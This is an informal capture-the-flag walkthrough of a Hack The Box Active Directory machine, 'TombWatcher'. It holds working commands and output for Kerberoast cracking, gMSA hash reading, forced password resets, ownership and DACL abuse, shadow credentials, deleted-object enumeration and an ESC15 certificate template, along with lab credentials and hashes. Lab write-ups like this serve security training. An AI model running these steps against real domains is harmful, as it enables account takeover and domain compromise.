
Write SPN over alfred

```
* Zero-Byte
* Not-Iterated
* Single-Hash
* Single-Salt

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 90c

Host memory required for this attack: 1 MB

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

$krb5tgs$23$*Alfred$TOMBWATCHER.HTB$tombwatcher.htb/Alfred*$f4b44aa2a46c81be050cd91fe91c5a13$64799b6ae780324e1fd0f132b44f6dd7685b1fcae5d21fe40274812c660e248c3636782e412a7a4902cff2232aa297b95cdf132dfc58843491d5a9c2a2d85cb35c089a22ea7295e9d2f7147d2b6a3dd628e043b50435d9c99e8a220c00eede7059c9956c1866762da05f2d1d63b8b65f890cd66162f558e7e35c43e2b124a5cb77becd4fda71c919f3f6abbf89e9d6edc3404ea14e7ce8d766a461195f4c218ca84704e5481789337029265ece3398a7d0ccc4510459f5bd174009fba92055ae97931728db5e750bcbef62eb02a85885e2184a8c0aaab4d07bfef1792a3217e134f04cc0b1399ad5dc563b16ba3806b585847b6bf062ae02982d0e92b005cf3354ad6b0dd0cce382f8a076ad90883faab684263562c7de5e5f5f37a972651ed121d6b82e5c318cb1130ba6878246515da8c622df7be3688bd976d82def0868ac2f30394f40263062966581f267688a71a82dcbb2e87b0fbfb003fa434915f7f0a69f68ca3af376b793e77c92a46c317f06e10f27607417954944e9632595251051a092a85d4bd126bd4f5e73e95dd1a52e9c01780a9603a6d13b50fc193f5c0dfff60cfd52b6f6ae31c0811cac530392a4516324068c1975102d64830ece21d9a5c6fc01fc64381a2be7b90edef2b0147a83c74367b61d0a0d6fee4706181a8bcf3cda859f6514830da91f1c6e1a3c400ea92cc04ac6c66cd40e280d8fb90401288b6240b2b028bd14d9b64f3b1e59338ad65543f02465706ba143848bac0cff2dfc40a7f8da209a9f7daff84aee299d854281900eac36dd8138bcef05013642fe251d5b7a179ac7aa77092d82e0ef8bbdb327cab43561564f4dfaa37dd40af34853e15962841a5615bcaca48557006a92f545d7a23443e62f17ec78aab68562dd78b20bb3a61521d365c0733c682f265d1475d9ec5f0b72cafb62bf0d845ebc07269f18a37e6d6365763b62f81b1c9ec7d7008739842b0eef9868fcb33e1f0f9d8706d94b2385cb8daf9a99e76e7fd43a0e38036d73d2aa1ea09e6a9225135b5d809b597e1b9593b07beae573ee47353575111042e0a0db2a7ecb20ce33a011605d9234027daf448589c4bb3cd917c0ecf50e90f6d77664ace284c634fefa229d9aad35b8f4dbc6155f6544a40d20eec035012e84fbb5feda9ab3cc0b1f669ab23b788881c37e13edc10b9a005684100121de1b156545aa20632b68d9883a41a0b8e7b95f83c43fe4c71a1643af44f947247b5b05538272ebdc6a9ae6eb1917c7350830553a60f3b337776006fe701229f1dda8379de4437c99f0a820e179907b2d6275edc12c08dab0ad633fbfbb0eb26a5d0a3ac07d4a653384d7162c4bb39dd24df0e5a05bf875841ae920c3603bc153cfdc7e23f08d087d4a6968f0546674d6dac0e6261133c3bfd39c54351a277009fe1b42dc59ac3749fe5563610747bc6293f7fbf62d512996c758bdf4a541807c91e755:basketball
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 13100 (Kerberos 5, etype 23, TGS-REP)
Hash.Target......: $krb5tgs$23$*Alfred$TOMBWATCHER.HTB$tombwatcher.htb...91e755
Time.Started.....: Sat Jun  7 20:11:56 2025 (1 sec)
Time.Estimated...: Sat Jun  7 20:11:57 2025 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:   507.8 kH/s (0.87ms) @ Accel:512 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 2048/14344385 (0.01%)
Rejected.........: 0/2048 (0.00%)
Restore.Point....: 0/14344385 (0.00%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: 123456 -> lovers1
Hardware.Mon.#1..: Util: 14%

Started: Sat Jun  7 20:11:53 2025
Stopped: Sat Jun  7 20:11:58 2025

```


Ansible object looked really fucking weird and investigating it further it turned out to be a GMSA thingamibob

```python
╭─LDAPS─[DC01.tombwatcher.htb]─[TOMBWATCHER\Alfred]-[NS:10.129.117.41]
╰─PV ❯ Get-DomainObject "CN=ANSIBLE_DEV,CN=MANAGED SERVICE ACCOUNTS,DC=TOMBWATCHER,DC=HTB"            
objectClass                       : top
                                    person
                                    organizationalPerson
                                    user
                                    computer
                                    msDS-GroupManagedServiceAccount   <------- gmsa
cn                                : ansible_dev
distinguishedName                 : CN=ansible_dev,CN=Managed Service Accounts,DC=tombwatcher,DC=htb
instanceType                      : 4
whenCreated                       : 16/11/2024 00:54:13 (6 months, 22 days ago)
whenChanged                       : 16/11/2024 00:54:13 (6 months, 22 days ago)
uSNCreated                        : 12819
uSNChanged                        : 12822
name                              : ansible_dev
objectGUID                        : {5631a537-f78b-400b-b171-990ef3e13b47}
userAccountControl                : WORKSTATION_TRUST_ACCOUNT
badPwdCount                       : 2
codePage                          : 0
countryCode                       : 0
badPasswordTime                   : 08/06/2025 00:33:18 (today)
lastLogoff                        : 1601-01-01 00:00:00+00:00
lastLogon                         : 01/01/1601 00:00:00 (424 years, 5 months ago)
localPolicyFlags                  : 0
pwdLastSet                        : 16/11/2024 00:54:13 (6 months, 22 days ago)
primaryGroupID                    : 515
objectSid                         : S-1-5-21-1392491010-1358638721-2126982587-1108
accountExpires                    : 9999-12-31 23:59:59.999999+00:00
logonCount                        : 0
sAMAccountName                    : ansible_dev$
sAMAccountType                    : SAM_MACHINE_ACCOUNT
dNSHostName                       : TOMBWATCHER.HTB
objectCategory                    : CN=ms-DS-Group-Managed-Service-Account,CN=Schema,CN=Configuration,DC=tombwatcher,DC=htb
isCriticalSystemObject            : False
dSCorePropagationData             : 01/01/1601 00:00:00 AM
msDS-SupportedEncryptionTypes     : RC4-HMAC
                                    AES128
                                    AES256
msDS-ManagedPasswordId            : AQAAAEtEU0sCAAAAagEAABsAAAAIAAAAc6NtcnDRepr24Tfly34IywAAAAAgAAAAIAAAAHQAbwBtAGIAdwBhAHQAYwBoAGUAcgAuAGgAdABiAAAAdABvAG0AYgB3AGEAdABjAGgAZQByAC4AaAB0AGIAAAA=
msDS-ManagedPasswordInterval      : 30
msDS-GroupMSAMembership           : S-1-5-21-1392491010-1358638721-2126982587-1107

```


so we try to use the NTLM gMSA we find nothing

```python
kali@kali ~> nxc ldap tombwatcher.htb -u 'alfred' -p 'basketball' --gmsa
LDAP        10.129.117.41   389    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:tombwatcher.htb) (signing:None) (channel binding:Never) 
LDAP        10.129.117.41   389    DC01             [+] tombwatcher.htb\alfred:basketball 
LDAP        10.129.117.41   389    DC01             [*] Getting GMSA Passwords
LDAP        10.129.117.41   389    DC01             Account: ansible_dev$         NTLM: <no read permissions>                PrincipalsAllowedToReadPassword: Infrastructure

```


The weird thing here is that we really cant do fat for fuck shit really sadly, there are NO users and NO inbound ACL's from bloodhound so the best thing to do would be to use powerview.py to investigate further 

this filter provided by dear mojo enumerates for ALL inbound ACLs


```python
╰─PV ❯ Get-ObjectAcl "CN=INFRASTRUCTURE,CN=USERS,DC=TOMBWATCHER,DC=HTB" -Select SecurityIdentifier,AccessMask,ActiveDirectoryRights,ObjectAceType -Where 'SecurityIdentifier not Principal Self' -ResolveGUIDs >


SecurityIdentifier                          AccessMask                   ActiveDirectoryRights    ObjectAceType
------------------------------------------  ---------------------------  -----------------------  ---------------------------------
BUILTIN\Windows Authorization Access Group  ReadProperty                 None                     Token-Groups-Global-And-Universal
Authenticated Users                         ControlAccess                None                     Send-To
TOMBWATCHER\Domain Admins                   FullControl                  FullControl              None
TOMBWATCHER\Alfred                          Self                         Self                     None  <------------------------- This is Extremely Interesting
Account Operators                           FullControl                  FullControl              None
Authenticated Users                         Read                         Read                     None
Local System                                FullControl                  FullControl              None
Anonymous                                   Read                         Read                     None
BUILTIN\Pre-Windows 2000 Compatible Access  ReadProperty                 None                     User-Account-Restrictions
BUILTIN\Pre-Windows 2000 Compatible Access  ReadProperty                 None                     User-Account-Restrictions
BUILTIN\Pre-Windows 2000 Compatible Access  ReadProperty                 None                     User-Logon
BUILTIN\Pre-Windows 2000 Compatible Access  ReadProperty                 None                     User-Logon
BUILTIN\Pre-Windows 2000 Compatible Access  ReadProperty                 None                     Membership
BUILTIN\Pre-Windows 2000 Compatible Access  ReadProperty                 None                     Membership
BUILTIN\Pre-Windows 2000 Compatible Access  ReadProperty                 None                     General-Information
BUILTIN\Pre-Windows 2000 Compatible Access  ReadProperty                 None                     General-Information
BUILTIN\Pre-Windows 2000 Compatible Access  ReadProperty                 None                     RAS-Information
BUILTIN\Pre-Windows 2000 Compatible Access  ReadProperty                 None                     RAS-Information
TOMBWATCHER\Key Admins                      ReadProperty, WriteProperty  None                     ms-DS-Key-Credential-Link
TOMBWATCHER\Enterprise Key Admins           ReadProperty, WriteProperty  None                     ms-DS-Key-Credential-Link
Creator Owner                               Self                         None                     DS-Validated-Write-Compute
Enterprise Domain Controllers               ReadProperty                 None                     Token-Groups
Enterprise Domain Controllers               ReadProperty                 None                     Token-Groups
Enterprise Domain Controllers               ReadProperty                 None                     Token-Groups
BUILTIN\Pre-Windows 2000 Compatible Access  ReadProperty                 None                     None
BUILTIN\Pre-Windows 2000 Compatible Access  ReadProperty                 None                     None
BUILTIN\Pre-Windows 2000 Compatible Access  ReadProperty                 None                     None
TOMBWATCHER\Enterprise Admins               FullControl                  FullControl              None
BUILTIN\Pre-Windows 2000 Compatible Access  ListChildObjects             ListChildObjects         None
Administrators                              ReadAndExecute               ReadAndExecute           None

```

This means that as a self, for groups we have add self permissions, for a computer we have writeSPN permissions for a user it means buttfuck nothing


```python
kali@kali ~> bloodyAD --host tombwatcher.htb -d tombwatcher.htb -u alfred -p 'basketball' add groupMember infrastructure alfred
[+] alfred added to infrastructure
kali@kali ~> nxc ldap tombwatcher.htb -u 'alfred' -p 'basketball'  --gmsa
LDAP        10.129.117.41   389    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:tombwatcher.htb) (signing:None) (channel binding:Never) 
LDAP        10.129.117.41   389    DC01             [+] tombwatcher.htb\alfred:basketball 
LDAP        10.129.117.41   389    DC01             [*] Getting GMSA Passwords
LDAP        10.129.117.41   389    DC01             Account: ansible_dev$         NTLM: 1c37d00093dc2a5f25176bf2d474afdc     PrincipalsAllowedToReadPassword: Infrastructure
```


```python
kali@kali ~> bloodyAD --host tombwatcher.htb -d tombwatcher.htb -u 'ansible_dev$' -p ':1c37d00093dc2a5f25176bf2d474afdc' set password sam 'ThankYouMojo123!'
[+] Password changed successfully!
```


```python
kali@kali ~> bloodyAD --host tombwatcher.htb -d tombwatcher.htb -u sam -p 'ThankYouMojo123!' set owner 'john' sam
[+] Old owner S-1-5-21-1392491010-1358638721-2126982587-512 is now replaced by sam on john
```


```
kali@kali ~ [1]> bloodyAD --host tombwatcher.htb -d tombwatcher.htb -u sam -p 'ThankYouMojo123!' add genericAll john sam
[+] sam has now GenericAll on john
```


```python
bloodyAD --host tombwatcher.htb -d tombwatcher.htb -u 'sam' -p 'ThankYouMojo123!' set password john 'ThankYouMojo123!'
```


```python
kali@kali ~> certipy shadow auto -u 'sam'@tombwatcher.htb -p 'ThankYouMojo123!'  -account 'john'
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[!] DNS resolution failed: The DNS query name does not exist: TOMBWATCHER.HTB.
[!] Use -debug to print a stacktrace
[*] Targeting user 'john'
[*] Generating certificate
[*] Certificate generated
[*] Generating Key Credential
[*] Key Credential generated with DeviceID 'd32c573c-20ad-e949-0bc2-c094c61c41c8'
[*] Adding Key Credential with device ID 'd32c573c-20ad-e949-0bc2-c094c61c41c8' to the Key Credentials for 'john'
[*] Successfully added Key Credential with device ID 'd32c573c-20ad-e949-0bc2-c094c61c41c8' to the Key Credentials for 'john'
[*] Authenticating as 'john' with the certificate
[*] Certificate identities:
[*]     No identities found in this certificate
[*] Using principal: 'john@tombwatcher.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'john.ccache'
[*] Wrote credential cache to 'john.ccache'
[*] Trying to retrieve NT hash for 'john'
[*] Restoring the old Key Credentials for 'john'
[*] Successfully restored the old Key Credentials for 'john'
[*] NT hash for 'john': 4c58593136462a92970916e84592af67

```


```
kali@kali ~> dacledit.py -action 'write' -rights 'FullControl' -principal john -target-dn 'OU=ADCS,DC=TOMBWATCHER,DC=HTB' -inheritance tombwatcher.htb/john:'ThankYouMojo123!' -dc-ip 10.129.117.41
Impacket v0.13.0.dev0+20250307.160229.6e0a969 - Copyright Fortra, LLC and its affiliated companies 

[*] NB: objects with adminCount=1 will no inherit ACEs from their parent container/OU
[*] DACL backed up to dacledit-20250607-212137.bak
[*] DACL modified successfully!
```

---


now we have a missing link, its something ADCS related since theres an OU called ADCS, so now were trying to find for deleted tombstoned objects in ADCS



```python
*Evil-WinRM* PS C:\Users\john\Documents> Get-ADObject -Filter 'isDeleted -eq $true' -IncludeDeletedObjects -Properties *                                                                                                                     
CanonicalName                   : tombwatcher.htb/Deleted Objects                                                                                                                                                                            
CN                              : Deleted Objects                                                                                                                                                                                            
Created                         : 11/15/2024 7:01:41 PM                                                                                                                                                                                      
createTimeStamp                 : 11/15/2024 7:01:41 PM                                                                                                                                                                                      
Deleted                         : True                                                                                                                                                                                                       
Description                     : Default container for deleted objects                                                                                                                                                                      
DisplayName                     :                                                                                                                                                                                                            
DistinguishedName               : CN=Deleted Objects,DC=tombwatcher,DC=htb                                                                                                                                                                   
dSCorePropagationData           : {12/31/1600 7:00:00 PM}                                                                                                                                                                                    
instanceType                    : 4                                                                                                                                                                                                          
isCriticalSystemObject          : True                                                                                                                                                                                                       
isDeleted                       : True                                                                                                                                                                                                       
LastKnownParent                 :                                                                                                                                                                                                            
Modified                        : 11/15/2024 7:56:00 PM                                                                                                                                                                                      
modifyTimeStamp                 : 11/15/2024 7:56:00 PM                                                                                                                                                                                      
Name                            : Deleted Objects                                                                                                                                                                                            
ObjectCategory                  : CN=Container,CN=Schema,CN=Configuration,DC=tombwatcher,DC=htb                                                                                                                                              
ObjectClass                     : container                                                                                                                                                                                                  
ObjectGUID                      : 34509cb3-2b23-417b-8b98-13f0bd953319                                                                                                                                                                       
ProtectedFromAccidentalDeletion :                                                                                                                                                                                                            
sDRightsEffective               : 0                                                                                                                                                                                                          
showInAdvancedViewOnly          : True                                                                                                                                                                                                       
systemFlags                     : -1946157056                                                                                                                                                                                                
uSNChanged                      : 12851                                                                                                                                                                                                      
uSNCreated                      : 5659                                                                                                                                                                                                       
whenChanged                     : 11/15/2024 7:56:00 PM                                                                                                                                                                                      
whenCreated                     : 11/15/2024 7:01:41 PM                                                                                                                                                                                      
                                                                                                                                                                                                                                             
accountExpires                  : 9223372036854775807                                                                                                                                                                                        
badPasswordTime                 : 0                                                                                                                                                                                                          
badPwdCount                     : 0                                                                                                                                                                                                          
CanonicalName                   : tombwatcher.htb/Deleted Objects/cert_admin                                                                                                                                                                 
                                  DEL:f80369c8-96a2-4a7f-a56c-9c15edd7d1e3                                                                                                                                                                   
CN                              : cert_admin                                                                                                                                                                                                 
                                  DEL:f80369c8-96a2-4a7f-a56c-9c15edd7d1e3                                                                                                                                                                   
codePage                        : 0                                                                                                                                                                                                          
countryCode                     : 0                                                                                                                                                                                                          
Created                         : 11/15/2024 7:55:59 PM                                                                                                                                                                                      
createTimeStamp                 : 11/15/2024 7:55:59 PM                                                                                                                                                                                      
Deleted                         : True                                                                                                                                                                                                       
Description                     :
DisplayName                     :
DistinguishedName               : CN=cert_admin\0ADEL:f80369c8-96a2-4a7f-a56c-9c15edd7d1e3,CN=Deleted Objects,DC=tombwatcher,DC=htb
dSCorePropagationData           : {11/15/2024 7:56:05 PM, 11/15/2024 7:56:02 PM, 12/31/1600 7:00:01 PM}
givenName                       : cert_admin
instanceType                    : 4
isDeleted                       : True
LastKnownParent                 : OU=ADCS,DC=tombwatcher,DC=htb
lastLogoff                      : 0
lastLogon                       : 0
logonCount                      : 0
Modified                        : 11/15/2024 7:57:59 PM
modifyTimeStamp                 : 11/15/2024 7:57:59 PM
msDS-LastKnownRDN               : cert_admin
Name                            : cert_admin
                                  DEL:f80369c8-96a2-4a7f-a56c-9c15edd7d1e3
nTSecurityDescriptor            : System.DirectoryServices.ActiveDirectorySecurity
ObjectCategory                  :
ObjectClass                     : user
ObjectGUID                      : f80369c8-96a2-4a7f-a56c-9c15edd7d1e3
objectSid                       : S-1-5-21-1392491010-1358638721-2126982587-1109      <--------------------------------- Not the one we want
primaryGroupID                  : 513
ProtectedFromAccidentalDeletion : False
pwdLastSet                      : 133761921597856970
sAMAccountName                  : cert_admin
sDRightsEffective               : 7
sn                              : cert_admin
userAccountControl              : 66048
uSNChanged                      : 12975
uSNCreated                      : 12844
whenChanged                     : 11/15/2024 7:57:59 PM
whenCreated                     : 11/15/2024 7:55:59 PM

accountExpires                  : 9223372036854775807
badPasswordTime                 : 0
badPwdCount                     : 0
CanonicalName                   : tombwatcher.htb/Deleted Objects/cert_admin
                                  DEL:c1f1f0fe-df9c-494c-bf05-0679e181b358
CN                              : cert_admin
                                  DEL:c1f1f0fe-df9c-494c-bf05-0679e181b358
codePage                        : 0
countryCode                     : 0
Created                         : 11/16/2024 12:04:05 PM
createTimeStamp                 : 11/16/2024 12:04:05 PM
Deleted                         : True
Description                     :
DisplayName                     :
DistinguishedName               : CN=cert_admin\0ADEL:c1f1f0fe-df9c-494c-bf05-0679e181b358,CN=Deleted Objects,DC=tombwatcher,DC=htb
dSCorePropagationData           : {11/16/2024 12:04:18 PM, 11/16/2024 12:04:08 PM, 12/31/1600 7:00:00 PM}
givenName                       : cert_admin
instanceType                    : 4
isDeleted                       : True

LastKnownParent                 : OU=ADCS,DC=tombwatcher,DC=htb
lastLogoff                      : 0
lastLogon                       : 0
logonCount                      : 0
Modified                        : 11/16/2024 12:04:21 PM
modifyTimeStamp                 : 11/16/2024 12:04:21 PM
msDS-LastKnownRDN               : cert_admin
Name                            : cert_admin
                                  DEL:c1f1f0fe-df9c-494c-bf05-0679e181b358
nTSecurityDescriptor            : System.DirectoryServices.ActiveDirectorySecurity
ObjectCategory                  :
ObjectClass                     : user
ObjectGUID                      : c1f1f0fe-df9c-494c-bf05-0679e181b358
objectSid                       : S-1-5-21-1392491010-1358638721-2126982587-1110  <---------------------- Not the one we want
primaryGroupID                  : 513
ProtectedFromAccidentalDeletion : False
pwdLastSet                      : 133762502455822446
sAMAccountName                  : cert_admin
sDRightsEffective               : 7
sn                              : cert_admin
userAccountControl              : 66048
uSNChanged                      : 13171
uSNCreated                      : 13161
whenChanged                     : 11/16/2024 12:04:21 PM
whenCreated                     : 11/16/2024 12:04:05 PM

accountExpires                  : 9223372036854775807
badPasswordTime                 : 0
badPwdCount                     : 0
CanonicalName                   : tombwatcher.htb/Deleted Objects/cert_admin
                                  DEL:938182c3-bf0b-410a-9aaa-45c8e1a02ebf
CN                              : cert_admin
                                  DEL:938182c3-bf0b-410a-9aaa-45c8e1a02ebf
codePage                        : 0
countryCode                     : 0
Created                         : 11/16/2024 12:07:04 PM
createTimeStamp                 : 11/16/2024 12:07:04 PM
Deleted                         : True
Description                     :
DisplayName                     :
DistinguishedName               : CN=cert_admin\0ADEL:938182c3-bf0b-410a-9aaa-45c8e1a02ebf,CN=Deleted Objects,DC=tombwatcher,DC=htb
dSCorePropagationData           : {11/16/2024 12:07:10 PM, 11/16/2024 12:07:08 PM, 12/31/1600 7:00:00 PM}
givenName                       : cert_admin
instanceType                    : 4
isDeleted                       : True
LastKnownParent                 : OU=ADCS,DC=tombwatcher,DC=htb
lastLogoff                      : 0
lastLogon                       : 0
logonCount                      : 0
Modified                        : 11/16/2024 12:07:27 PM
modifyTimeStamp                 : 11/16/2024 12:07:27 PM

Deleted                         : True
Description                     :
DisplayName                     :
DistinguishedName               : CN=cert_admin\0ADEL:938182c3-bf0b-410a-9aaa-45c8e1a02ebf,CN=Deleted Objects,DC=tombwatcher,DC=htb
dSCorePropagationData           : {11/16/2024 12:07:10 PM, 11/16/2024 12:07:08 PM, 12/31/1600 7:00:00 PM}
givenName                       : cert_admin
instanceType                    : 4
isDeleted                       : True
LastKnownParent                 : OU=ADCS,DC=tombwatcher,DC=htb
lastLogoff                      : 0
lastLogon                       : 0
logonCount                      : 0
Modified                        : 11/16/2024 12:07:27 PM
modifyTimeStamp                 : 11/16/2024 12:07:27 PM
msDS-LastKnownRDN               : cert_admin
Name                            : cert_admin
                                  DEL:938182c3-bf0b-410a-9aaa-45c8e1a02ebf
nTSecurityDescriptor            : System.DirectoryServices.ActiveDirectorySecurity
ObjectCategory                  :
ObjectClass                     : user
ObjectGUID                      : 938182c3-bf0b-410a-9aaa-45c8e1a02ebf
objectSid                       : S-1-5-21-1392491010-1358638721-2126982587-1111   <------------------------------- The one we want
primaryGroupID                  : 513
ProtectedFromAccidentalDeletion : False
pwdLastSet                      : 133762504248946345
sAMAccountName                  : cert_admin
sDRightsEffective               : 7
sn                              : cert_admin
userAccountControl              : 66048
uSNChanged                      : 13197
uSNCreated                      : 13186
whenChanged                     : 11/16/2024 12:07:27 PM
whenCreated                     : 11/16/2024 12:07:04 PM


```


root, this was a deleted user!



```python
╭─LDAPS─[DC01.tombwatcher.htb]─[TOMBWATCHER\Alfred]-[NS:10.129.117.41]
╰─PV ❯ Get-DomainUser "cert_admin"                                    
objectClass                       : top
                                    person
                                    organizationalPerson
                                    user
cn                                : cert_admin
distinguishedName                 : CN=cert_admin,OU=ADCS,DC=tombwatcher,DC=htb
name                              : cert_admin
objectGUID                        : {938182c3-bf0b-410a-9aaa-45c8e1a02ebf}
userAccountControl                : NORMAL_ACCOUNT
                                    DONT_EXPIRE_PASSWORD
badPwdCount                       : 0
badPasswordTime                   : 01/01/1601 00:00:00 (424 years, 5 months ago)
lastLogoff                        : 1601-01-01 00:00:00+00:00
lastLogon                         : 01/01/1601 00:00:00 (424 years, 5 months ago)
pwdLastSet                        : 16/11/2024 17:07:04 (6 months, 22 days ago)
primaryGroupID                    : 513
objectSid                         : S-1-5-21-1392491010-1358638721-2126982587-1111
sAMAccountName                    : cert_admin
sAMAccountType                    : SAM_USER_OBJECT
objectCategory                    : CN=Person,CN=Schema,CN=Configuration,DC=tombwatcher,DC=htb
vulnerabilities                   : [VULN-002] User account with password that never expires (LOW)

```


Now running certipy as that user!


```python
  4                                                                                                                   
    Template Name                       : WebServer                                                                   
    Display Name                        : Web Server                                                                  
    Certificate Authorities             : tombwatcher-CA-1                                                            
    Enabled                             : True                                                                        
    Client Authentication               : False                                                                       
    Enrollment Agent                    : False                                                                       
    Any Purpose                         : False                                                                       
    Enrollee Supplies Subject           : True                                                                        
    Certificate Name Flag               : EnrolleeSuppliesSubject                                                     
    Extended Key Usage                  : Server Authentication                                                       
    Requires Manager Approval           : False                                                                       
    Requires Key Archival               : False                                                                       
    Authorized Signatures Required      : 0                                                                           
    Schema Version                      : 1                                                                           
    Validity Period                     : 2 years                                                                     
    Renewal Period                      : 6 weeks                                                                     
    Minimum RSA Key Length              : 2048                                                                        
    Template Created                    : 2024-11-16T00:57:49+00:00                                                   
    Template Last Modified              : 2024-11-16T17:07:26+00:00          
    Permissions                                                                                                       
      Enrollment Permissions                                                                                          
        Enrollment Rights               : TOMBWATCHER.HTB\Domain Admins                                               
                                          TOMBWATCHER.HTB\Enterprise Admins                                           
                                          TOMBWATCHER.HTB\cert_admin                                                  
      Object Control Permissions                                                                                                                                                                                                             
        Owner                           : TOMBWATCHER.HTB\Enterprise Admins                                                                                                                                                                  
        Full Control Principals         : TOMBWATCHER.HTB\Domain Admins                                               
                                          TOMBWATCHER.HTB\Enterprise Admins                                           
        Write Owner Principals          : TOMBWATCHER.HTB\Domain Admins                                               
                                          TOMBWATCHER.HTB\Enterprise Admins                                           
        Write Dacl Principals           : TOMBWATCHER.HTB\Domain Admins                                               
                                          TOMBWATCHER.HTB\Enterprise Admins                                           
        Write Property Enroll           : TOMBWATCHER.HTB\Domain Admins                                               
                                          TOMBWATCHER.HTB\Enterprise Admins                                           
                                          TOMBWATCHER.HTB\cert_admin                                                  
    [+] User Enrollable Principals      : TOMBWATCHER.HTB\cert_admin                                                  
    [!] Vulnerabilities                                                                                               
      ESC15                             : Enrollee supplies subject and schema version is 1.                          
    [*] Remarks                                                                                                       
      ESC15                             : Only applicable if the environment has not been patched. See CVE-2024-49019 or the wiki for more details.                                                                                     5                                                                                                                   

```





The next step here was going to be ESC15 EKUWU for the shell, but for the ldap shell giving us RBCD would have ALSO worked



- use bloodhound-python
- investigate how to enumerate remotely deleted AD Objects
- powerview.py find hidden ACE's
	- addself


